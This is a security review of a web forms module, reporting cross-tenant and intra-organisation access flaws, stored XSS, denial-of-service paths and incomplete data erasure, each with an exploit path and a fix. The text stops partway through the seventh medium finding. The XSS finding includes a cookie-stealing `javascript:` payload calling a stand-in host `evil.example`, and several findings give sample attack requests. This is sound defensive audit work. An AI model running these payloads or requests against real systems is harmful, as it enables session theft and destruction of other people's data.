# forms → core — security review of the unauthenticated surface

**Scope:** `packages/core/src/modules/forms/` as vendored, at branch `cez/8028aa77`
(fork point `cez/c82a4a14`, tip `4746947e1`).
**Mode:** read-only diagnosis. No source file was changed. Nothing here is fixed.
**Method:** every `api/public/**` handler read end to end; every `requireAuth: false` route in the
module enumerated; the token, upload, embed, expression and data-protection surfaces read against
their callers; one module-wide `em.find*` scoping sweep (§8, 136 call sites).

Ground rules applied: root `AGENTS.md` § Data & Security / § UI & HTTP, `packages/core/AGENTS.md`
§ Access Control / § Encryption / § API Routes, and the house patterns in `auth`,
`customer_accounts`, `attachments` and `apps/mercato/next.config.ts`.

Counts: **2 Critical, 4 High, 7 Medium, 6 Low, 3 Nit.**

One note on what is *already* fixed and deliberately not re-reported: `b940fad11` closed the
unauthenticated cross-tenant read on `GET /api/forms/:id/run/context` and
`POST /api/forms/:id/run/submissions`. Both now carry `requireAuth: true` and scope by the caller's
tenant + organization. Verified at `api/[id]/run/context/route.ts:27` and
`api/[id]/run/submissions/route.ts:44`.

---

## The unauthenticated route inventory

Twelve handlers in this module answer without a platform session. What authorises each:

| Route | Authoriser | Unguessable? | Constant-time? |
|---|---|---|---|
| `POST public/start` | distribution `public_slug` **or** raw invitation token | yes — `randomBytes(16)` / `randomBytes(32)` | n/a (indexed equality / SHA-256 hash lookup) |
| `GET public/distributions/:slug` | `public_slug` | yes | n/a |
| `GET public/distributions/:slug/embed-policy` | `public_slug`; fails closed on miss | yes | n/a |
| `GET public/invitations/:token` | raw invitation token → SHA-256 → `token_hash` | yes (256-bit) | n/a (hash lookup) |
| `GET public/embed-loader` | none — static public script, no secrets | n/a | n/a |
| `GET/PATCH public/submissions/:id` | `resolveRuntimePrincipal`: HMAC access token **or** portal session | token yes | **yes** (`timingSafeEqual`) |
| `POST public/submissions/:id/submit` | same | same | yes |
| `POST public/submissions/:id/attachments` | same | same | yes |
| `GET public/submissions/:id/attachments/:attachmentId` | same | same | yes |
| `GET public/submissions/:id/pdf` | same | same | yes |
| `GET by-key/:key/active` | `requireAuth:false` but 401s without a **portal customer session** | n/a | n/a |
| `GET/PATCH form-submissions/:id`, `POST .../submit`, `.../attachments`, `.../resume-token`, `POST form-submissions` | same — portal session, checked in the handler | n/a | n/a |

The bearer-capability half of that table is sound. **The portal-session half is where the holes
are**: every route that accepts a customer session accepts *any* customer session in the
organization, and three of them never check that the caller is an actor on the submission.

---

# Critical

## C1 — Any `forms.submissions.anonymize` holder can irreversibly destroy **any other tenant's** submission

**Where:** `services/anonymize-service.ts:51`, reached from
`api/submissions/[submissionId]/anonymize/route.ts:83`.

```ts
// services/anonymize-service.ts:46-54
async anonymize(submissionId: string): Promise<{ … }> {
  const em = this.options.em
  const submission = await em.findOne(FormSubmission, { id: submissionId })   // ← no org, no tenant
  if (!submission) {
    throw new AnonymizeServiceError('SUBMISSION_NOT_FOUND', 'Submission not found.')
  }
```

The route does resolve and validate the caller's scope — and then throws it away:

```ts
// api/submissions/[submissionId]/anonymize/route.ts:54-56, 83
if (!auth.tenantId || !auth.orgId) {
  return NextResponse.json({ error: 'Tenant scope required' }, { status: 403 })
}
…
const result = await service.anonymize(submissionId)      // ← auth.orgId / auth.tenantId never passed
```

`anonymize` is the only method in the whole service layer with this shape. Its siblings
(`SubmissionService.getCurrent/save/submit/reopen`, `AttachmentService.findScopedSubmission`,
`PdfSnapshotService.ensureSnapshot:160`) all take `{ organizationId, tenantId }` and filter on both.

**Exploit path.** Attacker is a legitimate user in tenant A holding `forms.submissions.anonymize`
(granted to `admin` by default — `setup.ts:5-12`). They learn a submission UUID belonging to tenant
B or to a sibling organization: for the sibling-org case that is trivial in a multi-org tenant, and
cross-tenant it leaks through any shared support ticket, exported CSV, or simply through the
attacker having been a *participant* on another tenant's public form (the anonymous runner puts the
submission id in the URL path of every save/submit call the respondent's own browser makes).

```
POST /api/forms/submissions/<victim-submission-uuid>/anonymize
Cookie: <tenant A admin session>
{"confirm":"DELETE"}
```

`anonymize` loads the victim row, walks *every* revision, decrypts each with the **victim's** org DEK
(`submission.organizationId`, line 83), overwrites every `x-om-sensitive` answer with
`__anonymized__`, re-encrypts, stamps `anonymized_at` on each revision and on the submission, and
replaces `submit_metadata` wholesale (lines 93-96). The command surface forbids undo by design
(class docstring, line 41) — there is no recovery short of a database restore.

**Why the surrounding code does not mitigate it.** `requireFeatures: ['forms.submissions.anonymize']`
gates *who may anonymize*, not *what they may anonymize* — the feature check is scope-free by
construction. The 403 at line 54-56 proves the route knows the caller's scope and simply does not
forward it. Worse, the audit row written afterwards is stamped with the **attacker's** organization:

```ts
// api/submissions/[submissionId]/anonymize/route.ts:84-91
await auditor.log(em, { organizationId: auth.orgId, submissionId, accessedBy: auth.sub, … })
```

`FormAccessAudit` is org-scoped, so the victim tenant's audit trail
(`GET /api/forms/submissions/:id/access-audit`, which filters by the reader's org) shows **nothing**.
The destruction is both cross-tenant and unattributable from the victim's side.

The same unscoped call is reached from the retention worker
(`workers/retention-purge.ts:132`), but there the id comes from a scoped scan, so that caller is safe.

**Minimal fix.** Change the signature to
`anonymize(args: { submissionId: string; organizationId: string; tenantId: string })`, add
`organizationId`/`tenantId` (and `deletedAt: null`) to the `findOne` at line 51, pass
`auth.orgId`/`auth.tenantId` from the route and the scan scope from `retention-purge.ts:132`. The
`FormVersion` lookup at line 62 should take the same scope. ~10 lines; regression test = "tenant A
cannot anonymize tenant B's submission → 404".

---

## C2 — Any portal customer can read **any** submission in their organization, fully decrypted and **unsliced**

**Where:** `services/submission-service.ts:824-867`, `lib/runtime-principal.ts:73-83`,
`api/form-submissions/[id]/route.ts:43,114-125`. Reached from four routes.

`getCurrent` scopes by org/tenant and then **never checks that the caller has any relationship to
the submission**:

```ts
// services/submission-service.ts:825-831
const submission = await em.findOne(FormSubmission, {
  id: args.submissionId, organizationId: args.organizationId,
  tenantId: args.tenantId, deletedAt: null,
})
```

…and the role slicing that would otherwise limit the damage is **opt-in on a truthy role**:

```ts
// services/submission-service.ts:866-867
let decodedData = decodedFull
if (args.viewerRole) {            // ← null role ⇒ NO role slicing, NO visibility slicing
```

`viewerRole: null` therefore means *more* access, not less. Two independent callers feed it a null
role for a caller with no standing at all:

```ts
// lib/runtime-principal.ts:73-83  — the customer branch ALWAYS emits role: null
const auth = await getCustomerAuthFromRequest(req)
if (auth) {
  return { source: 'customer', principal: auth.sub, role: null,
           organizationId: auth.orgId, tenantId: auth.tenantId, submissionId }
}
```

```ts
// api/form-submissions/[id]/route.ts:114-125 — no actor ⇒ null, and the caller proceeds anyway
async function resolveActiveRole(…): Promise<string | null> {
  const actor = await em.findOne(FormSubmissionActor, { submissionId, organizationId, userId, revokedAt: null, deletedAt: null })
  return actor?.role ?? null
}
```

This is demonstrably not the intended posture: the *write* path in the same service refuses a
non-actor outright —

```ts
// services/submission-service.ts:502-512
const actor = await trx.findOne(FormSubmissionActor, { submissionId: submission.id, organizationId, userId: args.savedBy, revokedAt: null, deletedAt: null })
if (!actor) {
  throw new SubmissionServiceError('NO_ACTOR', 'No active actor row for this user on this submission.', 403)
}
```

**Exploit path.** Attacker is any customer with a portal account in organization X — self-registration
is the normal case for a portal. They enumerate or obtain a submission UUID belonging to another
customer of X (submission ids appear in portal URLs, in `/api/form-submissions/by-subject/...`
responses, in emailed resume links, and in the attacker's own browser history if they were ever a
co-actor). Then, with nothing but their own portal cookie:

```
GET /api/forms/public/submissions/<victim-submission-id>      → 200
GET /api/form-submissions/<victim-submission-id>              → 200
GET /api/forms/public/submissions/<victim-submission-id>/pdf  → 200, application/pdf
GET /api/forms/public/submissions/<victim-submission-id>/attachments/<attachment-id> → 200, raw bytes
```

The first two return `decoded_data` — the **full decrypted answer payload** (every field, including
`x-om-sensitive` ones and fields hidden by `x-om-visibility-if`, because `viewerRole` is null) plus
the actor roster. The PDF route (`api/public/submissions/[id]/pdf/route.ts:44`, via
`PdfSnapshotService.ensureSnapshot`) renders and streams the same answers, and will *generate* the
snapshot on demand if one does not exist. The attachment route
(`api/public/submissions/[id]/attachments/[attachmentId]/route.ts:40`, via
`AttachmentService.readUpload`) streams the decrypted uploaded files. None of the four checks actor
membership.

For a module whose entire encryption story is written for PHI (`encryption.ts:6-19`,
`services/encryption-service.ts` "Refusing to encrypt forms PHI…"), this is a full read of the
protected data by any authenticated tenant user.

**Why the surrounding code does not mitigate it.** The tenant/organization scoping is correct and
does stop cross-*tenant* reads — the docstrings that claim "Cross-tenant ids return 404 (no
enumeration)" (`pdf/route.ts:9`, `attachments/[attachmentId]/route.ts:8-9`) are true and are also the
reason the gap reads as unnoticed: intra-organization isolation was simply never the question being
answered. `FormSubmissionActor` exists, is populated on `start`, is enforced on `save`, and is
returned in the response — the read path just never consults it. Rate limiting does not apply to
`GET` (see M1), so enumeration is not even throttled.

**Minimal fix.** Two changes, both small:

1. In `submission-service.ts`, make `getCurrent` require standing. Either take a
   `requireActorUserId?: string | null` and 403 with `NO_ACTOR` when it is supplied and no active
   actor row matches, or — simpler and closer to `save` — resolve the actor inside `getCurrent` for
   every `source: 'customer'` caller. Mirror it in `readUpload` and `ensureSnapshot`.
2. In `lib/runtime-principal.ts:73-83`, resolve the caller's actor row and put its `role` on the
   principal instead of the hardcoded `null`, so role slicing applies to portal callers as it
   already does to token callers.

Then invert the default at `submission-service.ts:867`: slice unless the caller is an admin surface
caller, rather than slice only when a role happens to be present.

---

# High

## H1 — Stored XSS on the anonymous `/f/:slug` page: `z.string().url()` accepts `javascript:`

**Where:** `data/validators.ts:318`, `ui/public/FormRunner.tsx:165-169`; second sink at
`schema/jsonschema-extensions.ts:421-427` → `runner/FormRunner.tsx:127-128`.

```ts
// data/validators.ts:318
const optionalRedirectUrl = z.string().url().max(2000).optional().nullable()
```

```tsx
// ui/public/FormRunner.tsx:165-169
const redirectTarget = props.redirectUrl?.trim() ? props.redirectUrl.trim() : null
React.useEffect(() => {
  if (stage === 'completed' && redirectTarget && typeof window !== 'undefined') {
    window.location.href = redirectTarget
  }
}, [stage, redirectTarget])
```

`z.string().url()` in this repo's zod does **not** constrain the scheme. Verified by running it
against the repo's installed copy:

```
$ node -e "…" (repo root, zod 4.4.3)
zod 4.4.3
ACCEPT  "javascript:alert(document.cookie)"
ACCEPT  "data:text/html,<script>a</script>"
ACCEPT  "JaVaScRiPt:alert(1)"
ACCEPT  "https://ok.example"
ACCEPT  "vbscript:msgbox(1)"
```

The second sink is validated even more weakly — the schema extension checks only that the value is a
string:

```ts
// schema/jsonschema-extensions.ts:421-428
const redirect = candidate['x-om-redirect-url']
…
  return `Section "${candidate.key}" x-om-redirect-url must be a string or null when present.`
```

```tsx
// runner/FormRunner.tsx:126-129
const redirectUrl = endingSection?.['x-om-redirect-url']
if (typeof redirectUrl === 'string' && redirectUrl.length > 0 && typeof window !== 'undefined') {
  window.location.assign(redirectUrl)
}
```

**Exploit path.** A user holding `forms.distribute` (a distinct, lower feature than `forms.design` —
`acl.ts:7`) creates an open distribution with
`redirectUrl: "javascript:fetch('https://evil.example/?c='+document.cookie+'&d='+await(await fetch('/api/forms')).text())"`.
The value survives `distributionCreateCommandSchema` (`validators.ts:384`), is stored, and is handed
to every anonymous respondent by `GET /api/forms/public/distributions/:slug` and
`POST /api/forms/public/submissions/:id/submit` (`redirect_url` in the response body). On completion,
`window.location.href = <javascript: URI>` executes attacker JavaScript **in the application's own
origin**.

The blast radius is not confined to the attacker's own tenant, because `/f/:slug` is a single shared
origin for every tenant in the deployment. Any staff user or portal customer of *any other* tenant
who opens the link — a plausible thing to do; it is a public form link — runs that script with their
session, same-origin, able to call every admin API they are authorised for.

**Why the surrounding code does not mitigate it.** The app's global CSP explicitly permits inline
script execution, which is what makes a `javascript:` URI run rather than be blocked:

```
apps/mercato/next.config.ts:18
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com",
```

Nothing else normalises the value — not the command handler
(`commands/distribution.ts:166,197,317-320`, plain assignment), not the serializer, not the runner.
React's JSX escaping is irrelevant here: the value never reaches JSX, it reaches
`window.location.href` / `location.assign`.

**Minimal fix.** Replace `optionalRedirectUrl` at `validators.ts:318` with a scheme-checked
refinement — parse with `new URL(value)` and require `protocol === 'https:'` (allowing `http:` only
for localhost, exactly as `lib/embed-frame-policy.ts:50-73` already does for embed origins; that
helper is the house pattern and could be generalised). Apply the same check to
`x-om-redirect-url` in `jsonschema-extensions.ts:421-427`. Belt-and-braces: guard both call sites
before navigating.

---

## H2 — Any portal customer can finalise **someone else's** draft submission

**Where:** `services/submission-service.ts:671-702`, reached from
`api/public/submissions/[id]/submit/route.ts:97` and `api/form-submissions/[id]/submit/route.ts`.

```ts
// services/submission-service.ts:673-695 (abridged)
const submission = await trx.findOne(FormSubmission,
  { id: args.submissionId, organizationId: args.organizationId, tenantId: args.tenantId, deletedAt: null },
  { lockMode: LockMode.PESSIMISTIC_WRITE })
if (!submission) throw …404
if (submission.status === 'submitted') throw …422
if (submission.status === 'archived')  throw …422
if (submission.currentRevisionId !== args.baseRevisionId) throw …409
submission.status = 'submitted'
submission.submittedAt = this.now()
submission.submittedBy = args.submittedBy
```

Status, optimistic-concurrency and scope checks — **no actor check**, in contrast with `save` twelve
lines of the same file away (`:502-512`, quoted in C2).

**Exploit path.** The same attacker as C2 (any portal customer in the organization) reads the victim
submission to learn its `currentRevisionId` (C2 gives them that for free), then:

```
POST /api/forms/public/submissions/<victim-id>/submit
Cookie: <attacker portal session>
{"base_revision_id":"<victim current revision>"}
```

The victim's draft is irreversibly transitioned to `submitted`, stamped with the **attacker's** user
id in `submitted_by`, and their IP/UA in `submit_metadata` (`api/runtime-helpers.ts:57-70`). Because
`save` refuses to write to a submission the caller does not act on, the victim cannot simply continue
— the form is frozen mid-completion and `forms.submission.submitted` fires downstream (PDF snapshot
generation, consent projection, notifications). Only a `forms.submissions.manage` holder can reopen
it.

**Why the surrounding code does not mitigate it.** The `principal.source === 'token'` branch of the
public route is fine — the token is HMAC-bound to `(submissionId, invitationId)` so a token holder
can only submit their own. The customer branch has no equivalent binding, and the cap-reservation
logic at `route.ts:70-95` is deliberately skipped for it, so not even the distribution cap pushes
back.

**Minimal fix.** Add the same `FormSubmissionActor` lookup `save` performs (`:502-512`) to `submit`
before the status transition, keyed on `args.submittedBy`; keep the current behaviour for the token
path by passing the invitation id as the actor user id (that is already how `start` seeds the actor
row — `distribution-service.ts:311-319`, `startedBy: invitation.id`).

---

## H3 — Unauthenticated row-exhaustion through `POST /api/forms/public/start`

**Where:** `api/public/start/route.ts:127-131` → `services/distribution-service.ts:289-309`.

Every anonymous start on an open-mode distribution **creates persistent rows**, with no per-caller
budget:

```ts
// services/distribution-service.ts:289-308 (abridged)
} else {
  invitation = em.create(FormInvitation, { distributionId: distribution.id, … status: 'started', … })
  em.persist(invitation)
  await em.flush()
}
const view = await this.submissionService.start({ … })   // → submission + revision + actor rows
```

One request → 1 `forms_form_invitation` + 1 `forms_form_submission` + 1
`forms_form_submission_revision` (an encrypted blob) + 1 `forms_form_submission_actor`.

**Exploit path.** Take any public form link (they are meant to be published). Loop
`POST /api/forms/public/start {"slug":"…"}`, rotating `X-Forwarded-For` each request (see M1). Four
rows per request, unbounded, in a tenant's live tables. The rows are also indistinguishable from
real abandoned starts, so the tenant's analytics (`services/analytics-service.ts` funnel/volume) are
poisoned along with the storage.

**Why the surrounding code does not mitigate it.** The module's own documented answer is that abuse
falls back to distribution-level caps:

```
// api/public/rate-limit.ts:5-9
… every request is allowed — abuse controls then fall back to the distribution-level caps,
the availability window, and token entropy (R-2d-1).
```

But the cap counts **submits**, not starts: `responseCount` is only incremented in
`reserveResponseSlot` (`distribution-service.ts:338-355`), which is called from the *submit* route
(`submit/route.ts:90-94`). `assertDistributionAvailable` therefore never trips for a start-only
flood. The availability window bounds the flood in time, not in volume, and the CAPTCHA gate is
opt-in and by default presence-only (see M2). The limiter itself is fail-open and per-spoofable-IP
(M1).

**Minimal fix.** Either count starts too (a second counter on the distribution, checked in
`beginAnonymous` against a `maxStarts` derived from `maxResponses`, e.g. `maxResponses * 3`), or —
cheaper — do not persist an invitation/submission until the first `PATCH` autosave, keeping `start`
a pure schema+token handshake. A per-distribution limiter key (`forms:public:start:<distributionId>`)
in addition to the per-IP one would bound the worst case without either change.

---

## H4 — Pre-authentication unbounded body buffering on the public upload route

**Where:** `api/public/submissions/[id]/attachments/route.ts:43` vs `:50`, and
`api/attachment-helpers.ts:89-110`.

```ts
// api/public/submissions/[id]/attachments/route.ts:38-51
const limited = await enforcePublicRateLimit(`forms:public:upload:${submissionId}:${getClientIp(req)}`)
if (limited) return limited

const parsed = await parseUploadBody(req)          // ← reads the ENTIRE body into memory
if (parsed instanceof NextResponse) return parsed
…
const principal = await resolveRuntimePrincipal({ req, submissionId, em })   // ← auth happens HERE
if (!principal) return NextResponse.json({ error: 'UNAUTHORIZED' }, { status: 401 })
```

```ts
// api/attachment-helpers.ts:92,104-109
form = await req.formData()
…
const arrayBuffer = await filePart.arrayBuffer()
return { …, bytes: Buffer.from(arrayBuffer) }
```

The size gate runs later still, inside the service, on an already-materialised Buffer
(`services/attachment-service.ts:114-124` → `evaluateUploadGate`).

**Exploit path.** No credentials at all:

```
POST /api/forms/public/submissions/00000000-0000-4000-8000-000000000000/attachments
Content-Type: multipart/form-data; …
<2 GB of bytes>
```

The handler buffers all of it in the Node heap, *then* returns 401. A handful of concurrent requests
exhausts the process. The App Router has no default body-size limit for `Request.formData()` (the
Pages-Router `api.bodyParser.sizeLimit` knob does not apply), and this repo sets none — no
`bodySizeLimit`, `maxRequestBodySize` or equivalent exists in `apps/mercato/next.config.ts` or
`apps/mercato/src/proxy.ts`.

**Why the surrounding code does not mitigate it.** `FORMS_MAX_UPLOAD_BYTES` /
`DEFAULT_MAX_UPLOAD_BYTES` (10 MiB, `services/upload-validation.ts:10`) is enforced on
`args.bytes.length` — i.e. after the allocation it is supposed to prevent. The rate limiter runs
first but is fail-open and per-spoofable-IP (M1), and even at its 30/min default that is 30
unbounded allocations per minute per forged IP.

**Minimal fix.** Reorder: call `resolveRuntimePrincipal` before `parseUploadBody` (it needs only
headers and the route param, so nothing blocks the move), and reject early on
`Content-Length > resolveMaxUploadBytes()` before touching the body. Both are a handful of lines in
`route.ts`; the same reorder applies to the authenticated twin,
`api/form-submissions/[id]/attachments/route.ts`.

---

# Medium

## M1 — The public rate limiter is keyed on a spoofable header, collapses to one global bucket without it, fails open, and does not cover the read routes

**Where:** `api/public/rate-limit.ts:25-46`.

```ts
export function getClientIp(req: NextRequest): string {
  return req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown'
}
…
export async function enforcePublicRateLimit(key: string): Promise<NextResponse | null> {
  try {
    const limiter = getCachedRateLimiterService()
    if (!limiter) return null                       // not configured ⇒ unlimited
    …
  } catch {
    return null                                     // any error ⇒ unlimited
  }
}
```

Three distinct weaknesses, all real:

1. **Spoofable key.** `X-Forwarded-For` is the *client's* first hop unless a trusted proxy rewrites
   it. An attacker sends `X-Forwarded-For: 1.2.3.<n>` and gets a fresh 30-request bucket per value —
   the limiter is bypassed entirely, which is what makes H3 and H4 practical.
2. **`'unknown'` global bucket.** Deployments that do *not* front the app with a proxy setting XFF
   land every anonymous caller in one shared `forms:public:start:unknown` bucket: 30 starts per
   minute for the entire deployment, i.e. a trivially-triggered denial of service against legitimate
   respondents. This is the repo's known IP-or-`'global'` trap in a different costume.
3. **No coverage on reads.** `GET public/submissions/:id`
   (`api/public/submissions/[id]/route.ts:37-49`), `GET …/pdf` and
   `GET …/attachments/:attachmentId` call no limiter at all, so the C2 enumeration is unthrottled and
   the PDF route — which *generates* a PDF on a cache miss — is an unmetered CPU sink for anyone with
   one valid session.

**Why the fail-open posture is nonetheless deliberate and partly right.** The file's docstring
argues a limiter must never 500 a public request, and that is correct. The problem is that it also
never *logs* the degradation, so an operator whose limiter is misconfigured sees a healthy public
surface with no throttling at all.

**Minimal fix.** Derive the client IP through the platform's trusted-proxy resolution rather than
raw XFF (and if none exists, gate XFF behind an explicit `TRUST_PROXY`-style env, falling back to the
socket address); never key a bucket on the literal `'unknown'` — fall back to something
request-derived like the submission id alone; add `enforcePublicRateLimit` to the three read routes;
and `reportError`/`logger.warn` once when the limiter resolves to null so fail-open is visible.

## M2 — The CAPTCHA gate accepts any non-empty string when no provider is configured, and has no admin surface

**Where:** `api/public/start/route.ts:58-69`, `services/captcha-verifier.ts:52-56,142-149`.

```ts
// api/public/start/route.ts:64-68
if (!captchaRequired(args.distribution)) return { ok: true }
if (!args.token) return { ok: false, error: 'CAPTCHA_REQUIRED' }
if (!isCaptchaProviderConfigured(process.env)) return { ok: true }    // ← accepts ANY token
const result = await args.verifier.verify({ token: args.token, remoteIp: args.remoteIp })
```

**Exploit path.** A tenant enables `settings.captcha` on a distribution. The deployment has no
`FORMS_CAPTCHA_PROVIDER`/`FORMS_CAPTCHA_SECRET`. Every bot posts
`{"slug":"…","captchaToken":"x"}` and passes. The tenant's UI (and the OpenAPI doc, which advertises
`CAPTCHA_FAILED`) says the form is CAPTCHA-protected; it is not.

**Why the surrounding code does not mitigate it.** The provider verifier is genuinely fail-*closed*
(`captcha-verifier.ts:114-124`: non-2xx, malformed body, timeout and network error all resolve to
`{ success: false }`) — the weakness is only in the unconfigured path, which the route comments
honestly describe as backward compatibility. Compounding it: `settings.captcha` has **no admin UI at
all** — grepping `captcha` across `ui/` and `backend/` returns nothing, and
`data/validators.ts:360` documents that every settings key other than `embed` passes through
unvalidated. So the toggle can only be set by a direct API write, and nothing ever tells the operator
the provider is missing.

**Minimal fix.** Fail closed: when `captchaRequired(distribution)` is true and
`isCaptchaProviderConfigured(process.env)` is false, return 422 `CAPTCHA_UNAVAILABLE` (or 503) rather
than `{ ok: true }`, and log it once at startup. If backward compatibility must be preserved, put it
behind an explicit `FORMS_CAPTCHA_ALLOW_UNVERIFIED=true` opt-in so the insecure state is chosen, not
inherited.

## M3 — Attachment downloads serve attacker-declared `Content-Type` without the sandbox CSP the platform applies to its own attachment route

**Where:** `api/public/submissions/[id]/attachments/[attachmentId]/route.ts:46-53`,
`api/submissions/[submissionId]/attachments/[attachmentId]/route.ts:63-70`,
`api/attachment-helpers.ts:108`, versus `apps/mercato/next.config.ts:85-96`.

```ts
// api/public/submissions/[id]/attachments/[attachmentId]/route.ts:46-53
const safeName = result.filename.replace(/["\\\r\n]/g, '_') || 'attachment'
return new NextResponse(result.bytes as unknown as BodyInit, {
  status: 200,
  headers: {
    'content-type': result.contentType || 'application/octet-stream',
    'content-disposition': `attachment; filename="${safeName}"`,
  },
})
```

`result.contentType` is whatever the uploader's multipart part declared —
`contentType: filePart.type || 'application/octet-stream'` (`attachment-helpers.ts:108`) — persisted
verbatim (`attachment-service.ts:146`). Nothing sniffs magic bytes, so the field's `x-om-accept`
allowlist (`upload-validation.ts:44-59`) is a **client-declared** check: upload an HTML or SVG
payload while declaring `image/png` and it passes an `accept: ['image/png']` field.

The platform's own answer to exactly this problem is one route away:

```ts
// apps/mercato/next.config.ts:85-96
{
  // Attachment file downloads set their own restrictive CSP (sandbox) …
  source: '/api/attachments/file/:path*',
  headers: [
    { key: 'Content-Security-Policy', value: "default-src 'none'; sandbox" },
    …
  ],
},
```

Forms' two download routes are not covered by that entry and inherit the global policy
(`next.config.ts:76-83`), which carries `script-src 'self' 'unsafe-inline' 'unsafe-eval'` — the exact
opposite of a sandbox.

**Why the surrounding code partly mitigates it.** `Content-Disposition: attachment` and the global
`X-Content-Type-Options: nosniff` (`next.config.ts:81`) do stop a browser rendering the response
inline on direct navigation, which is why this is Medium and not High. The filename is also
correctly quote/CRLF-sanitised, so there is no header-injection or `Content-Disposition` escape here.
What remains is that the module ships a second user-upload download path that does **not** meet the
bar the platform set for the first, and the mitigation rests entirely on one header.

**Minimal fix.** Add `'content-security-policy': "default-src 'none'; sandbox"` and
`'x-content-type-options': 'nosniff'` to both handlers' response headers (route-level, so it does not
depend on a `next.config.ts` entry travelling with the module). Separately, either sniff the magic
bytes before trusting `contentType`, or normalise SVG/HTML/XML uploads to
`application/octet-stream` on store.

## M4 — `GET /api/forms/by-key/:key/active` role-slices the field index and then returns the whole raw schema next to it

**Where:** `api/by-key/[key]/active/route.ts:52-88,94-101`.

```ts
const fieldIndex: Record<string, unknown> = {}
for (const [fieldKey, descriptor] of Object.entries(compiled.fieldIndex)) {
  const visible = callerRoles.some((role) => descriptor.visibleTo.includes(role) || descriptor.editableBy.includes(role))
  if (!visible) continue                       // ← careful slicing…
  …
}
return NextResponse.json({
  …
  schema: formVersion.schema,                  // ← …handed back in full, unsliced
  uiSchema: formVersion.uiSchema,
  fieldIndex,
  callerRoles,
})
```

**Exploit path.** Any portal customer calls the route for a form key in their org and reads
`schema.properties` directly: every field the slicing just removed, plus its `x-om-sensitive` flags,
`x-om-visibility-if` predicates, jump rules, ending keys and `x-om-prefill` attribute names. The
slicing is cosmetic.

Second, weaker issue in the same file — the caller's roles are hardcoded:

```ts
function resolveCallerRoles(features: string[]): string[] {
  if (features.includes('*')) return ['admin']
  return ['patient', 'customer', 'guardian']     // ← every portal customer gets all three
}
```

The code flags this itself ("Phase 1d/2a will tighten this to look up the active actor row"), so a
form that grants `guardian` visibility to fields a `patient` may not see leaks them to every
customer even through the sliced index. The `'*'` wildcard handling is correct and matches the house
rule.

**Minimal fix.** Return a role-projected schema — the compiler already knows which keys survive, so
strip `schema.properties` / `uiSchema` to the same key set before serialising — or drop `schema`/
`uiSchema` from this response and let the runner build from `fieldIndex`. Then resolve real roles
from the caller's `FormSubmissionActor` rows (or the distribution's declared role) instead of the
hardcoded triple.

## M5 — Anonymisation and retention purge leave several complete copies of the data behind

**Where:** `services/anonymize-service.ts:81-103,106-118`, `workers/retention-purge.ts:132`.

```ts
function applyTombstone(decoded, compiled) {
  const result = { ...decoded }
  for (const [key, descriptor] of Object.entries(compiled.fieldIndex)) {
    if (!descriptor.sensitive) continue          // ← only x-om-sensitive fields
    if (Object.prototype.hasOwnProperty.call(result, key)) result[key] = ANONYMIZED_TOKEN
  }
  return result
}
```

What survives an "irreversible GDPR erasure":

| Copy | Where | Touched by anonymize? |
|---|---|---|
| Non-`x-om-sensitive` answers (free-text "anything else we should know?") | every revision | **no** |
| Uploaded files | `forms_form_attachment` `kind='user_upload'` (`attachment-service.ts:140-151`) | **no** |
| PDF snapshot — schema + **all** decrypted answers + submit metadata | `forms_form_attachment` `kind='snapshot'` (`pdf-snapshot-service.ts:272-273`, doc at `:341`) | **no** |
| Recipient email / name | `forms_form_invitation` (encrypted, but recoverable) | **no** |
| Reader IP / UA | `forms_form_access_audit` (plaintext) | no — deliberate, per the route doc |
| Submitter IP / UA | `forms_form_submission.submit_metadata` | **yes** (`:93-96`) |

The retention worker calls the same method (`retention-purge.ts:132`), so a form with
`retentionDays: 30` still holds the participant's uploaded ID scan and a PDF of every answer
indefinitely.

**Why the surrounding code does not mitigate it.** The class docstring is accurate about what it
does — the gap is between that and what the route, the ACL feature title ("Anonymize submissions
(GDPR erasure)", `acl.ts:6`) and `lib/retention.ts:19-22` ("…without retaining patient PII beyond the
window") promise. `FormAttachment` has a `removedAt` column, so the mechanism for removing
attachments exists and is simply not used here.

**Minimal fix.** In `anonymize`, after the revision loop: set `removedAt = now` and null
`payloadInline` on every `FormAttachment` for the submission (both kinds), clear
`submission.pdfSnapshotAttachmentId`, and null the invitation's `recipientEmail`/`recipientName`
where `submissionId` matches. Whether non-sensitive free-text should also be tombstoned is a product
decision — but the current default (erase only what was explicitly flagged) should at least be
stated in the ACL feature title and the admin confirmation copy.

## M6 — Ajv runs `allErrors: true` / `strict: false` over untrusted submission payloads with no size ceiling

**Where:** `services/form-version-compiler.ts:707`, `data/validators.ts:85-89`.

```ts
// services/form-version-compiler.ts:707
const ajv = new Ajv({ allErrors: true, useDefaults: false, strict: false })
```

```ts
// data/validators.ts:85-89
export const submissionSaveInputSchema = z.object({
  base_revision_id: z.string().uuid(),
  patch: z.record(z.string(), z.unknown()),    // ← no size or depth bound
  change_summary: z.string().max(500).optional(),
})
```

`allErrors: true` is the option Ajv's own security guidance singles out as a DoS vector on untrusted
input: it disables short-circuiting, so every keyword is evaluated against every value even after the
first failure. The input here is an anonymous participant's `patch`, which is unbounded — `patch` is
an open record, `readJsonBody` (`api/runtime-helpers.ts:153-159`) is a plain `req.json()`, and no
body-size limit is configured anywhere in the app (see H4).

`strict: false` additionally means a mistyped or unknown keyword in a tenant's schema is silently
ignored rather than rejected — a `maxLenght: 50` constraint simply does not exist at runtime, with no
signal to the author.

The amplifier: `pattern` constraints are compiled to real `RegExp`s and evaluated server-side against
that unbounded input. A form author (only `forms.design`, and plausibly by accident) who writes a
backtracking-prone pattern such as `^(\w+\s?)*$` hands every anonymous respondent a way to wedge a
server worker with a 50 KB answer. `field-validation-service` compiles the same patterns for the
runtime rules.

**Why the surrounding code partly mitigates it.** The role write-filter
(`role-policy-service` → `filterWritePatch`, called at `submission-service.ts:554`) drops keys that
are not declared writable fields, so the *key set* is bounded by the schema. It does not bound the
*value* size — a single declared string field can carry the whole payload.

**Minimal fix.** Three independent one-liners: cap the serialized patch (a `.refine()` on
`submissionSaveInputSchema` rejecting `JSON.stringify(patch).length > ~256 KB`, 413); flip Ajv to
`allErrors: false` for the runtime-validation instance (keep `allErrors: true` for the authoring/
studio instance where the input is trusted and the error list is the point); and reject
catastrophic-backtracking patterns at publish time, or compile them with a RE2-style engine.

## M7 — The dev KMS adapter is selected silently, with a hardcoded default seed, whenever `NODE_ENV !== 'production'`

**Where:** `services/encryption-service.ts:238-256`, `:85-99`.

```ts
if (env.NODE_ENV === 'production') {
  throw new FormsEncryptionError('INSECURE_KMS_IN_PRODUCTION', …)
}
